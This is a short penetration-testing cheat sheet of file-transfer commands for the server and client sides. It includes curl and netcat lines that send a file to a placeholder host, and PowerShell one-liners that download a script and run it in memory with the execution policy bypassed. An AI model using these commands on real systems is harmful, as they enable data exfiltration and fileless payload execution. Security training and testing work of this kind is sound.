# General - File Transfer

### Server side

```
# Python - Web Server
python -m SimpleHTTPServer <PORT>

# curl
curl -F ‘data=@<FILE>' http://<IP>:<PORT>

# nc
nc -w 3 <IP> <PORT> < <FILE>
Get-Content <FILE> | ./nc.exe -w 3 <IP> <PORT>

# impacket-smbserver - SMB share
impacket-smbserver <SHARE_NAME> <SHARE_PATH>
impacket-smbserver <SHARE_NAME> `pwd`

```

### Client side

```

# wget
wget http:/<IP>:<PORT>/<FILE>
wget -O file http://<IP>:<PORT>t/<FILE>
wget -r --no-parent -nH --reject "index.html*" http://<IP>:<PORT>/<DIR>

# curl
curl http://<IP>:<PORT>/<FILE> > out.file
curl -O http://<IP>:<PORT>/<FILE>

# netcat
nc -l -p <PORT> > out.file
nc -l -p <PORT> | tee out.file

# Python
python -c "from urllib import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', 'out.file')"
python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', 'out.file')"

# Powershell
(New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', 'out.file');

# Powershell - Load in memory and execute
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>'); Invoke-ImportedCMD"
echo IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>') | powershell -nop -exec bypass -

# Powershell - Connect to a SMB share
New-PSDrive -Name "LocalMountedFolder" -PSProvider "FileSystem" -Root "\\<IP>\<SHARE>"; cd LocalMountedFolder:


```
